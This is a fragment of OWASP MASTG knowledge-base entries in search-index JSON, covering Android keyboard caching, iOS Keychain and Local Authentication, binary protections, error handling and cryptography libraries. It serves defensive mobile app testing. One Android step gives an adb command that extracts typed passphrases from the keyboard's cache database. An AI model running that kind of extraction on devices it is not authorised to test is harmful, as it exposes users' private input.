very useful for messaging apps and other scenarios. However, by default, the Android keyboard may retain (or \"cache\") input history to offer suggestions and auto-completion. In contexts where sensitive data is entered (such as passwords or PINs), this caching behavior can inadvertently expose sensitive information.</p> <p>Apps can control this behavior by appropriately configuring the <code>inputType</code> attribute on text input fields. There are several ways to do this:</p> <p>XML Layouts:</p> <p>In the app's XML layout files (typically located in the <code>/res/layout</code> directory after unpacking the APK), you can define the input type directly in the <code>&lt;EditText&gt;</code> element using the <code>android:inputType</code> attribute. For example, setting the input type to <code>\"textPassword\"</code> automatically disables auto-suggestions and caching:</p> <pre><code>&lt;EditText\n    android:id=\"@+id/password\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"wrap_content\"\n    android:hint=\"@string/password_hint\"\n    android:inputType=\"textPassword\" /&gt;\n</code></pre> <p>Using the Traditional Android View System:</p> <p>When creating input fields in code using the traditional Android view system, you can set the input type programmatically. For example, using an <code>EditText</code> in Kotlin:</p> <pre><code>val input = EditText(context).apply {\n    hint = \"Enter PIN\"\n    inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD\n}\n</code></pre> <p>Using Jetpack Compose:</p> <p>If you are developing with Jetpack Compose, you do not use <code>EditText</code> directly. Instead, you use composable functions such as <code>TextField</code> or <code>OutlinedTextField</code> along with parameters like <code>keyboardOptions</code> and <code>visualTransformation</code> to achieve similar behavior. For example, to create a password field without suggestions:</p> <pre><code>OutlinedTextField(\n    value = password,\n    onValueChange = { password = it },\n    label = { Text(\"Enter Password\") },\n    visualTransformation = PasswordVisualTransformation(),\n    keyboardOptions = KeyboardOptions(\n        keyboardType = KeyboardType.Password,\n        autoCorrect = false\n    ),\n    modifier = Modifier.fillMaxWidth()\n)\n</code></pre> <p>In this Compose example, the <code>PasswordVisualTransformation()</code> masks the input, and <code>keyboardOptions</code> with <code>KeyboardType.Password</code> helps specify the password input type. The <code>autoCorrect</code> parameter is set to <code>false</code> to prevent suggestions.</p> <p>Internally, the <code>KeyboardType</code> enum in Jetpack Compose maps to the Android <code>inputType</code> values. For example, the <code>KeyboardType.Password</code> corresponds to the following <code>inputType</code>:</p> <pre><code>KeyboardType.Password -&gt; {\n    this.inputType =\n        InputType.TYPE_CLASS_TEXT or EditorInfo.TYPE_TEXT_VARIATION_PASSWORD\n}\n</code></pre>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0055/#non-caching-input-types","title":"Non-Caching Input Types","text":"<p>Regardless of the method used, the app can use the following <code>inputType</code> attributes, when applied to <code>&lt;EditText&gt;</code> elements, instruct the system to disable suggestions and prevent caching for those input fields:</p> XML <code>android:inputType</code> Code <code>InputType</code> API level <code>textNoSuggestions</code> <code>TYPE_TEXT_FLAG_NO_SUGGESTIONS</code> 3 <code>textPassword</code> <code>TYPE_TEXT_VARIATION_PASSWORD</code> 3 <code>textVisiblePassword</code> <code>TYPE_TEXT_VARIATION_VISIBLE_PASSWORD</code> 3 <code>numberPassword</code> <code>TYPE_NUMBER_VARIATION_PASSWORD</code> 11 <code>textWebPassword</code> <code>TYPE_TEXT_VARIATION_WEB_PASSWORD</code> 11 <p>Note: In the MASTG tests we won't be checking the minimum required SDK version in the Android Manifest <code>minSdkVersion</code> because we are considering testing modern apps. If you are testing an older app, you should check it. For example, Android API level 11 is required for <code>textWebPassword</code>. Otherwise, the compiled app would not honor the used input type constants allowing keyboard caching.</p> <p>The <code>inputType</code> attribute is a bitwise combination of flags and classes. The <code>InputType</code> class contains constants for both flags and classes. The flags are defined as <code>TYPE_TEXT_FLAG_*</code> and the classes are defined as <code>TYPE_CLASS_*</code>. The values of these constants are defined in the Android source code. You can find the source code for the <code>InputType</code> class here.</p> <p>The <code>inputType</code> attribute in Android is a bitwise combination of these constants:</p> <ul> <li>Class constants (<code>TYPE_CLASS_*</code>): Input type (text, number, phone, etc.)</li> <li>Variation constants (<code>TYPE_TEXT_VARIATION_*</code>, etc.): Specific behavior (password, email, URI, etc.)</li> <li>Flag constants (<code>TYPE_TEXT_FLAG_*</code>): Additional modifiers (no suggestions, multi-line, etc.)</li> </ul> <p>For example, this Kotlin code:</p> <pre><code>inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD\n</code></pre> <p>Where:</p> <ul> <li><code>TYPE_CLASS_TEXT</code> = 1</li> <li><code>TYPE_TEXT_VARIATION_PASSWORD</code> = 128</li> </ul> <p>Results in <code>1 or 128 = 129</code>, which is the value you will see in the decompiled code.</p> <p>How to decode input type attributes after reverse engineering:</p> <p>To decode the <code>inputType</code> value, you can use the following masks:</p> <ul> <li><code>TYPE_MASK_CLASS</code> = <code>0x0000000F</code> (to extract the class part)</li> <li><code>TYPE_MASK_VARIATION</code> = <code>0x00000FF0</code> (to extract the variation part)</li> <li><code>TYPE_MASK_FLAGS</code> = <code>0x00FFF000</code> (to extract the flags part)</li> </ul> <p>You can quickly decode <code>inputType</code> values using the masks and the bitwise AND operation e.g. in Python:</p> <pre><code>129 &amp; 0x0000000F  #   1 (TYPE_CLASS_TEXT)\n129 &amp; 0x00000FF0  # 128 (TYPE_TEXT_VARIATION_PASSWORD)\n</code></pre> <p>How to find cached data:</p> <p>If you write e.g. \"OWASPMAS\" in the passphrase field a couple of times, the app will cache it and you will be able to find it in the cache database:</p> <pre><code>adb shell 'strings /data/data/com.google.android.inputmethod.latin/databases/trainingcachev3.db' | grep -i \"OWASPMAS\"\nOWASPMAS@\nOWASPMAS@\nOWASPMAS%\n</code></pre>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-AUTH/MASTG-KNOW-0056/","title":"MASTG-KNOW-0056: Local Authentication Framework","text":"<p>The Local Authentication framework provides facilities for requesting a passphrase or Touch ID authentication from users. Developers can display and utilize an authentication prompt by utilizing the function <code>evaluatePolicy</code> of the <code>LAContext</code> class.</p> <p>Two available policies define acceptable forms of authentication:</p> <ul> <li> <p><code>deviceOwnerAuthentication</code>(Swift) or <code>LAPolicyDeviceOwnerAuthentication</code>(Objective-C): When available, the user is prompted to perform Touch ID authentication. If Touch ID is not activated, the device passcode is requested instead. If the device passcode is not enabled, policy evaluation fails.</p> </li> <li> <p><code>deviceOwnerAuthenticationWithBiometrics</code> (Swift) or <code>LAPolicyDeviceOwnerAuthenticationWithBiometrics</code>(Objective-C): Authentication is restricted to biometrics where the user is prompted for Touch ID.</p> </li> </ul> <p>The <code>evaluatePolicy</code> function returns a boolean value indicating whether the user has authenticated successfully.</p> <p>The Apple Developer website offers code samples for both Swift and Objective-C. A typical implementation in Swift looks as follows.</p> <pre><code>let context = LAContext()\nvar error: NSError?\n\nguard context.canEvaluatePolicy(.deviceOwnerAuthentication, error: &amp;error) else {\n    // Could not evaluate policy; look at error and present an appropriate message to user\n}\n\ncontext.evaluatePolicy(.deviceOwnerAuthentication, localizedReason: \"Please, pass authorization to enter this area\") { success, evaluationError in\n    guard success else {\n        // User did not authenticate successfully, look at evaluationError and take appropriate action\n    }\n\n    // User authenticated successfully, take appropriate action\n}\n</code></pre>","tags":["ios","MASVS-AUTH","know"]},{"location":"MASTG/knowledge/ios/MASVS-AUTH/MASTG-KNOW-0057/","title":"MASTG-KNOW-0057: Keychain Services","text":"<p>The iOS keychain APIs can (and should) be used to implement local authentication. During this process, the app stores either a secret authentication token or another piece of secret data identifying the user in the keychain. In order to authenticate to a remote service, the user must unlock the keychain using their passphrase or fingerprint to obtain the secret data.</p> <p>The keychain allows saving items with the special <code>SecAccessControl</code> attribute, which will allow access to the item from the keychain only after the user has passed Touch ID authentication (or passcode, if such a fallback is allowed by attribute parameters).</p> <p>Note regarding temporariness of keys in the Keychain: Unlike macOS and Android, iOS does not support temporariness of an item's accessibility in the keychain: when there is no additional security check when entering the keychain (e.g. <code>kSecAccessControlUserPresence</code> or similar is set), then once the device is unlocked, a key will be accessible.</p> <p>In the following example we will save the string \"test_strong_password\" to the keychain. The string can be accessed only on the current device while the passcode is set (<code>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly</code> parameter) and after Touch ID authentication for the currently enrolled fingers only (<code>SecAccessControlCreateFlags.biometryCurrentSet</code> parameter):</p> <pre><code>// 1. Create the AccessControl object that will represent authentication settings\n\nvar error: Unmanaged&lt;CFError&gt;?\n\nguard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,\n                                                          kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,\n                                                          SecAccessControlCreateFlags.biometryCurrentSet,\n                                                          &amp;error) else {\n    // failed to create AccessControl object\n\n    return\n}\n\n// 2. Create the keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute\n\nvar query: [String: Any] = [:]\n\nquery[kSecClass as String] = kSecClassGenericPassword\nquery[kSecAttrLabel as String] = \"com.me.myapp.password\" as CFString\nquery[kSecAttrAccount as String] = \"OWASP Account\" as CFString\nquery[kSecValueData as String] = \"test_strong_password\".data(using: .utf8)! as CFData\nquery[kSecAttrAccessControl as String] = accessControl\n\n// 3. Save the item\n\nlet status = SecItemAdd(query as CFDictionary, nil)\n\nif status == noErr {\n    // successfully saved\n} else {\n    // error while saving\n}\n\n// 4. Now we can request the saved item from the keychain. Keychain services will present the authentication dialog to the user and return data or nil depending on whether a suitable fingerprint was provided or not.\n\n// 5. Create the query\nvar query = [String: Any]()\nquery[kSecClass as String] = kSecClassGenericPassword\nquery[kSecReturnData as String] = kCFBooleanTrue\nquery[kSecAttrAccount as String] = \"My Name\" as CFString\nquery[kSecAttrLabel as String] = \"com.me.myapp.password\" as CFString\nquery[kSecUseOperationPrompt as String] = \"Please, pass authorisation to enter this area\" as CFString\n\n// 6. Get the item\nvar queryResult: AnyObject?\nlet status = withUnsafeMutablePointer(to: &amp;queryResult) {\n    SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))\n}\n\nif status == noErr {\n    let password = String(data: queryResult as! Data, encoding: .utf8)!\n    // successfully received password\n} else {\n    // authorization not passed\n}\n</code></pre>","tags":["ios","MASVS-AUTH","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0058/","title":"MASTG-KNOW-0058: App Signing","text":"<p>Code signing your app assures users that the app has a known source and hasn't been modified since it was last signed. Before your app can integrate app services, be installed on a non-jailbroken device, or be submitted to the App Store, it must be signed with a certificate issued by Apple. For more information on how to request certificates and code sign your apps, review the App Distribution Guide.</p>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0059/","title":"MASTG-KNOW-0059: Third-Party Libraries","text":"<p>iOS applications often make use of third party libraries which accelerate development as the developer has to write less code in order to solve a problem. However, third party libraries may contain vulnerabilities, incompatible licensing, or malicious content. Additionally, it is difficult for organizations and developers to manage application dependencies, including monitoring library releases and applying available security patches.</p> <p>There are three widely used package management tools Swift Package Manager, Carthage, and CocoaPods:</p> <ul> <li>The Swift Package Manager is open source, included with the Swift language, integrated into Xcode (since Xcode 11) and supports Swift, Objective-C, Objective-C++, C, and C++ packages. It is written in Swift, decentralized and uses the Package.swift file to document and manage project dependencies.</li> <li>Carthage is open source and can be used for Swift and Objective-C packages. It is written in Swift, decentralized and uses the Cartfile file to document and manage project dependencies.</li> <li>CocoaPods is open source and can be used for Swift and Objective-C packages. It is written in Ruby, utilizes a centralized package registry for public and private packages and uses the Podfile file to document and manage project dependencies.</li> </ul> <p>There are two categories of libraries:</p> <ul> <li>Libraries that are not (or should not) be packed within the actual production application, such as <code>OHHTTPStubs</code> used for testing.</li> <li>Libraries that are packed within the actual production application, such as <code>Alamofire</code>.</li> </ul> <p>These libraries can lead to unwanted side-effects:</p> <ul> <li>A library can contain a vulnerability, which will make the application vulnerable. A good example is <code>AFNetworking</code> version 2.5.1, which contained a bug that disabled certificate validation. This vulnerability would allow attackers to execute Machine-in-the-Middle (MITM) attacks against apps that are using the library to connect to their APIs.</li> <li>A library can no longer be maintained or hardly be used, which is why no vulnerabilities are reported and/or fixed. This can lead to having bad and/or vulnerable code in your application through the library.</li> <li>A library can use a license, such as LGPL2.1, which requires the application author to provide access to the source code for those who use the application and request insight in its sources. In fact the application should then be allowed to be redistributed with modifications to its source code. This can endanger the intellectual property (IP) of the application.</li> </ul> <p>Please note that this issue can hold on multiple levels: When you use webviews with JavaScript running in the webview, the JavaScript libraries can have these issues as well. The same holds for plugins/libraries for Cordova, React-native and Xamarin apps.</p>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0060/","title":"MASTG-KNOW-0060: Memory Corruption Bugs","text":"<p>iOS applications have various ways to run into memory corruption bugs: first there are the native code issues which have been mentioned in the general Memory Corruption Bugs section. Next, there are various unsafe operations with both Objective-C and Swift to actually wrap around native code which can create issues. Last, both Swift and Objective-C implementations can result in memory leaks due to retaining objects which are no longer in use.</p> <p>Learn more:</p> <ul> <li>https://developer.ibm.com/tutorials/mo-ios-memory/</li> <li>https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/MemoryMgmt/Articles/MemoryMgmt.html</li> <li>https://medium.com/zendesk-engineering/ios-identifying-memory-leaks-using-the-xcode-memory-graph-debugger-e84f097b9d15</li> </ul>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0061/","title":"MASTG-KNOW-0061: Binary Protection Mechanisms","text":"<p>Detecting the presence of binary protection mechanisms heavily depend on the language used for developing the application.</p> <p>Although Xcode enables all binary security features by default, it may be relevant to verify this for old applications or to check for compiler flag misconfigurations. The following features are applicable:</p> <ul> <li>PIE (Position Independent Executable):<ul> <li>PIE applies to executable binaries (Mach-O type <code>MH_EXECUTE</code>) source.</li> <li>However it's not applicable for libraries (Mach-O type <code>MH_DYLIB</code>).</li> </ul> </li> <li>Memory management:<ul> <li>Both pure Objective-C, Swift and hybrid binaries should have ARC (Automatic Reference Counting) enabled.</li> <li>For C/C++ libraries, the developer is responsible for doing proper manual memory management. See \"Memory Corruption Bugs\".</li> </ul> </li> <li>Stack Smashing Protection: For pure Objective-C binaries, this should always be enabled. Since Swift is designed to be memory safe, if a library is purely written in Swift, and stack canaries weren't enabled, the risk will be minimal.</li> </ul> <p>Learn more:</p> <ul> <li>OS X ABI Mach-O File Format Reference</li> <li>On iOS Binary Protections</li> <li>Security of runtime process in iOS and iPadOS</li> <li>Mach-O Programming Topics - Position-Independent Code</li> </ul> <p>Tests to detect the presence of these protection mechanisms heavily depend on the language used for developing the application. For example, existing techniques for detecting the presence of stack canaries do not work for pure Swift apps.</p>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0061/#xcode-project-settings","title":"Xcode Project Settings","text":"","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0061/#stack-canary-protection","title":"Stack Canary protection","text":"<p>Steps for enabling stack canary protection in an iOS application:</p> <ol> <li>In Xcode, select your target in the \"Targets\" section, then click the \"Build Settings\" tab to view the target's settings.</li> <li>Make sure that the \"-fstack-protector-all\" option is selected in the \"Other C Flags\" section.</li> <li>Make sure that Position Independent Executables (PIE) support is enabled.</li> </ol>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0061/#pie-protection","title":"PIE protection","text":"<p>Steps for building an iOS application as PIE:</p> <ol> <li>In Xcode, select your target in the \"Targets\" section, then click the \"Build Settings\" tab to view the target's settings.</li> <li>Set the iOS Deployment Target to iOS 4.3 or later.</li> <li>Make sure that \"Generate Position-Dependent Code\" (section \"Apple Clang - Code Generation\") is set to its default value (\"NO\").</li> <li>Make sure that \"Generate Position-Dependent Executable\" (section \"Linking\") is set to its default value (\"NO\").</li> </ol>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0061/#arc-protection","title":"ARC protection","text":"<p>ARC is automatically enabled for Swift apps by the <code>swiftc</code> compiler. However, for Objective-C apps you'll have ensure that it's enabled by following these steps:</p> <ol> <li>In Xcode, select your target in the \"Targets\" section, then click the \"Build Settings\" tab to view the target's settings.</li> <li>Make sure that \"Objective-C Automatic Reference Counting\" is set to its default value (\"YES\").</li> </ol> <p>See the Technical Q&amp;A QA1788 Building a Position Independent Executable.</p>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0062/","title":"MASTG-KNOW-0062: Debuggable Apps","text":"<p>Apps can be made debuggable ( Debugging) by adding the <code>get-task-allow</code> key to the app entitlements file and setting it to <code>true</code>.</p> <p>While debugging is a useful feature when developing an app, it has to be turned off before releasing apps to the App Store or within an enterprise program. To do that you need to determine the mode in which your app is to be generated to check the flags in the environment:</p> <ul> <li>Select the build settings of the project</li> <li>Under 'Apple LVM - Preprocessing' and 'Preprocessor Macros', make sure 'DEBUG' or 'DEBUG_MODE' is not selected (Objective-C)</li> <li>Make sure that the \"Debug executable\" option is not selected.</li> <li>Or in the 'Swift Compiler - Custom Flags' section / 'Other Swift Flags', make sure the '-D DEBUG' entry does not exist.</li> </ul>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0063/","title":"MASTG-KNOW-0063: Debugging Symbols","text":"<p>As a good practice, as little explanatory information as possible should be provided with a compiled binary. The presence of additional metadata such as debug symbols might provide valuable information about the code, e.g. function names leaking information about what a function does. This metadata is not required to execute the binary and thus it is safe to discard it for the release build, which can be done by using proper compiler configurations. As a tester you should inspect all binaries delivered with the app and ensure that no debugging symbols are present (at least those revealing any valuable information about the code).</p> <p>When an iOS application is compiled, the compiler generates a list of debug symbols for each binary file in an app (the main app executable, frameworks, and app extensions). These symbols include class names, global variables, and method and function names which are mapped to specific files and line numbers where they're defined. Debug builds of an app place the debug symbols in a compiled binary by default, while release builds of an app place them in a companion Debug Symbol file (dSYM) to reduce the size of the distributed app.</p>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0064/","title":"MASTG-KNOW-0064: Debugging Code and Error Logging","text":"<p>To speed up verification and get a better understanding of errors, developers often include debugging code, such as verbose logging statements (using <code>NSLog</code>, <code>println</code>, <code>print</code>, <code>dump</code>, and <code>debugPrint</code>) about responses from their APIs and about their application's progress and/or state. Furthermore, there may be debugging code for \"management-functionality\", which is used by developers to set the application's state or mock responses from an API. Reverse engineers can easily use this information to track what's happening with the application. Therefore, debugging code should be removed from the application's release version.</p>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0065/","title":"MASTG-KNOW-0065: Exception Handling","text":"<p>Exceptions often occur after an application enters an abnormal or erroneous state. Testing exception handling is about making sure that the application will handle the exception and get into a safe state without exposing any sensitive information via its logging mechanisms or the UI.</p> <p>Bear in mind that exception handling in Objective-C is quite different from exception handling in Swift. Bridging the two approaches in an application that is written in both legacy Objective-C code and Swift code can be problematic.</p>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0065/#exception-handling-in-objective-c","title":"Exception Handling in Objective-C","text":"<p>Objective-C has two types of errors:</p> <p>NSException:</p> <p><code>NSException</code> is used to handle programming and low-level errors (e.g., division by 0 and out-of-bounds array access). An <code>NSException</code> can either be raised by <code>raise</code> or thrown with <code>@throw</code>. Unless caught, this exception will invoke the unhandled exception handler, with which you can log the statement (logging will halt the program). <code>@catch</code> allows you to recover from the exception if you're using a <code>@try</code>-<code>@catch</code>-block:</p> <pre><code> @try {\n    //do work here\n }\n\n@catch (NSException *e) {\n    //recover from exception\n}\n\n@finally {\n    //cleanup\n</code></pre> <p>Bear in mind that using <code>NSException</code> comes with memory management pitfalls: you need to clean up allocations from the try block that are in the finally block. Note that you can promote <code>NSException</code> objects to <code>NSError</code> by instantiating an <code>NSError</code> in the <code>@catch</code> block.</p> <p>NSError:</p> <p><code>NSError</code> is used for all other types of errors. Some Cocoa framework APIs provide errors as objects in their failure callback in case something goes wrong; those that don't provide them pass a pointer to an <code>NSError</code> object by reference. It is a good practice to provide a <code>BOOL</code> return type to the method that takes a pointer to an <code>NSError</code> object to indicate success or failure. If there's a return type, make sure to return <code>nil</code> for errors. If <code>NO</code> or <code>nil</code> is returned, it allows you to inspect the error/reason for failure.</p>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CODE/MASTG-KNOW-0065/#exception-handling-in-swift","title":"Exception Handling in Swift","text":"<p>Exception handing in Swift (2 - 5) is quite different. The try-catch block is not there to handle <code>NSException</code>. The block is used to handle errors that conform to the <code>Error</code> (Swift 3) or <code>ErrorType</code> (Swift 2) protocol. This can be challenging when Objective-C and Swift code are combined in an application. Therefore, <code>NSError</code> is preferable to <code>NSException</code> for programs written in both languages. Furthermore, error-handling is opt-in in Objective-C, but <code>throws</code> must be explicitly handled in Swift. To convert error-throwing, look at the Apple documentation. Methods that can throw errors use the <code>throws</code> keyword. The <code>Result</code> type represents a success or failure, see Result, How to use Result in Swift 5 and The power of Result types in Swift. There are four ways to handle errors in Swift:</p> <ul> <li>Propagate the error from a function to the code that calls that function. In this situation, there's no <code>do-catch</code>; there's only a <code>throw</code> throwing the actual error or a <code>try</code> to execute the method that throws. The method containing the <code>try</code> also requires the <code>throws</code> keyword:</li> </ul> <pre><code>func dosomething(argumentx:TypeX) throws {\n    try functionThatThrows(argumentx: argumentx)\n}\n</code></pre> <ul> <li>Handle the error with a <code>do-catch</code> statement. You can use the following pattern:</li> </ul> <pre><code>func doTryExample() {\n    do {\n        try functionThatThrows(number: 203)\n    } catch NumberError.lessThanZero {\n        // Handle number is less than zero\n    } catch let NumberError.tooLarge(delta) {\n        // Handle number is too large (with delta value)\n    } catch {\n        // Handle any other errors\n    }\n}\n\nenum NumberError: Error {\n    case lessThanZero\n    case tooLarge(Int)\n    case tooSmall(Int)\n}\n\nfunc functionThatThrows(number: Int) throws -&gt; Bool {\n    if number &lt; 0 {\n        throw NumberError.lessThanZero\n    } else if number &lt; 10 {\n        throw NumberError.tooSmall(10 - number)\n    } else if number &gt; 100 {\n        throw NumberError.tooLarge(100 - number)\n    } else {\n        return true\n    }\n}\n</code></pre> <ul> <li>Handle the error as an optional value:</li> </ul> <pre><code>    let x = try? functionThatThrows()\n    // In this case the value of x is nil in case of an error.\n</code></pre> <ul> <li>Use the <code>try!</code> expression to assert that the error won't occur.</li> <li>Handle the generic error as a <code>Result</code> return:</li> </ul> <pre><code>enum ErrorType: Error {\n    case typeOne\n    case typeTwo\n}\n\nfunc functionWithResult(param: String?) -&gt; Result&lt;String, ErrorType&gt; {\n    guard let value = param else {\n        return .failure(.typeOne)\n    }\n    return .success(value)\n}\n\nfunc callResultFunction() {\n    let result = functionWithResult(param: \"OWASP\")\n\n    switch result {\n    case let .success(value):\n        // Handle success\n    case let .failure(error):\n        // Handle failure (with error)\n    }\n}\n</code></pre> <ul> <li>Handle network and JSON decoding errors with a <code>Result</code> type:</li> </ul> <pre><code>struct MSTG: Codable {\n    var root: String\n    var plugins: [String]\n    var structure: MSTGStructure\n    var title: String\n    var language: String\n    var description: String\n}\n\nstruct MSTGStructure: Codable {\n    var readme: String\n}\n\nenum RequestError: Error {\n    case requestError(Error)\n    case noData\n    case jsonError\n}\n\nfunc getMSTGInfo() {\n    guard let url = URL(string: \"https://raw.githubusercontent.com/OWASP/mastg/master/book.json\") else {\n        return\n    }\n\n    request(url: url) { result in\n        switch result {\n        case let .success(data):\n            // Handle success with MSTG data\n            let mstgTitle = data.title\n            let mstgDescription = data.description\n        case let .failure(error):\n            // Handle failure\n            switch error {\n            case let .requestError(error):\n                // Handle request error (with error)\n            case .noData:\n                // Handle no data received in response\n            case .jsonError:\n                // Handle error parsing JSON\n            }\n        }\n    }\n}\n\nfunc request(url: URL, completion: @escaping (Result&lt;MSTG, RequestError&gt;) -&gt; Void) {\n    let task = URLSession.shared.dataTask(with: url) { data, _, error in\n        if let error = error {\n            return completion(.failure(.requestError(error)))\n        } else {\n            if let data = data {\n                let decoder = JSONDecoder()\n                guard let response = try? decoder.decode(MSTG.self, from: data) else {\n                    return completion(.failure(.jsonError))\n                }\n                return completion(.success(response))\n            }\n        }\n    }\n    task.resume()\n}\n</code></pre>","tags":["ios","MASVS-CODE","know"]},{"location":"MASTG/knowledge/ios/MASVS-CRYPTO/MASTG-KNOW-0066/","title":"MASTG-KNOW-0066: CryptoKit","text":"<p>Apple CryptoKit was released with iOS 13 and is built on top of Apple's native cryptographic library corecrypto which is FIPS 140-2 validated. The Swift framework provides a strongly typed API interface, has effective memory management, conforms to equatable, and supports generics. CryptoKit contains secure algorithms for hashing, symmetric-key cryptography, and public-key cryptography. The framework can also utilize the hardware based key manager from the Secure Enclave.</p> <p>Apple CryptoKit contains the following algorithms:</p> <p>Hashes:</p> <ul> <li>MD5 (Insecure Module)</li> <li>SHA1 (Insecure Module)</li> <li>SHA-2 256-bit digest</li> <li>SHA-2 384-bit digest</li> <li>SHA-2 512-bit digest</li> </ul> <p>Symmetric-Key:</p> <ul> <li>Message Authentication Codes (HMAC)</li> <li>Authenticated Encryption<ul> <li>AES-GCM</li> <li>ChaCha20-Poly1305</li> </ul> </li> </ul> <p>Public-Key:</p> <ul> <li>Key Agreement<ul> <li>Curve25519</li> <li>NIST P-256</li> <li>NIST P-384</li> <li>NIST P-512</li> </ul> </li> </ul> <p>Examples:</p> <p>Generating and releasing a symmetric key:</p> <pre><code>let encryptionKey = SymmetricKey(size: .bits256)\n</code></pre> <p>Calculating a SHA-2 512-bit digest:</p> <pre><code>let rawString = \"OWASP MTSG\"\nlet rawData = Data(rawString.utf8)\nlet hash = SHA512.hash(data: rawData) // Compute the digest\nlet textHash = String(describing: hash)\nprint(textHash) // Print hash text\n</code></pre> <p>For more information about Apple CryptoKit, please visit the following resources:</p> <ul> <li>Apple CryptoKit | Apple Developer Documentation</li> <li>Performing Common Cryptographic Operations | Apple Developer Documentation</li> <li>WWDC 2019 session 709 | Cryptography and Your Apps</li> <li>How to calculate the SHA hash of a String or Data instance | Hacking with Swift</li> </ul>","tags":["ios","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/ios/MASVS-CRYPTO/MASTG-KNOW-0067/","title":"MASTG-KNOW-0067: CommonCrypto, SecKey and Wrapper libraries","text":"<p>The most commonly used Class for cryptographic operations is the CommonCrypto, which is packed with the iOS runtime. The functionality offered by the CommonCrypto object can best be dissected by having a look at the source code of the header file:</p> <ul> <li>The <code>Commoncryptor.h</code> gives the parameters for the symmetric cryptographic operations.</li> <li>The <code>CommonDigest.h</code> gives the parameters for the hashing Algorithms.</li> <li>The <code>CommonHMAC.h</code> gives the parameters for the supported HMAC operations.</li> <li>The <code>CommonKeyDerivation.h</code> gives the parameters for supported KDF functions.</li> <li>The <code>CommonSymmetricKeywrap.h</code> gives the function used for wrapping a symmetric key with a Key Encryption Key.</li> </ul> <p>Unfortunately, CommonCryptor lacks a few types of operations in its public APIs, such as: GCM mode is only available in its private APIs See its source code. For this, an additional binding header is necessary or other wrapper libraries can be used.</p> <p>Next, for asymmetric operations, Apple provides SecKey. Apple provides a nice guide in its Developer Documentation on how to use this.</p> <p>As noted before: some wrapper-libraries exist for both in order to provide convenience. Typical libraries that are used are, for instance:</p> <ul> <li>IDZSwiftCommonCrypto</li> <li>Heimdall</li> <li>SwiftyRSA</li> <li>RNCryptor</li> <li>Arcane</li> </ul>","tags":["ios","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/ios/MASVS-CRYPTO/MASTG-KNOW-0068/","title":"MASTG-KNOW-0068: Cryptographic Third-Party libraries","text":"<p>There are various third-party libraries available, such as:</p> <ul> <li>CJOSE: With the rise of JWE, and the lack of public support for AES GCM, other libraries have found their way, such as CJOSE. CJOSE still requires a higher level wrapping as they only provide a C/C++ implementation.</li> <li>CryptoSwift: A library in Swift, which can be found at GitHub. The library supports various hash-functions, MAC-functions, CRC-functions, symmetric ciphers, and password-based key derivation functions. It is not a wrapper, but a fully self-implemented version of each of the ciphers. It is important to verify the effective implementation of a function.</li> <li>OpenSSL: OpenSSL is the toolkit library used for TLS, written in C. Most of its cryptographic functions can be used to do the various cryptographic actions necessary, such as creating (H)MACs, signatures, symmetric- &amp; asymmetric ciphers, hashing, etc.. There are various wrappers, such as OpenSSL and MIHCrypto.</li> <li>LibSodium: Sodium is a modern, easy-to-use software library for encryption, decryption, signatures, password hashing and more. It is a portable, cross-compilable, installable, packageable fork of NaCl, with a compatible API, and an extended API to improve usability even further. See LibSodiums documentation for more details. There are some wrapper libraries, such as Swift-sodium, NAChloride, and libsodium-ios.</li> <li>Tink: A new cryptography library by Google. Google explains its reasoning behind the library on its security blog. The sources can be found at Tinks GitHub repository.</li> <li>Themis: a Crypto library for storage and messaging for Swift, Obj-C, Android/Java, \u0421++, JS, Python, Ruby, PHP, Go. Themis uses LibreSSL/OpenSSL engine libcrypto as a dependency. It supports Objective-C and Swift for key generation, secure messaging (e.g. payload encryption and signing), secure storage and setting up a secure session. See their wiki for more details.</li> <li>Others: There are many other libraries, such as CocoaSecurity, Objective-C-RSA, and aerogear-ios-crypto. Some of these are no longer maintained and might never have been security reviewed. Like always, it is recommended to look for supported and maintained libraries.</li> <li>DIY: An increasing amount of developers have created their own implementation of a cipher or a cryptographic function. This practice is highly discouraged and should be vetted very thoroughly by a cryptography expert if used.</li> 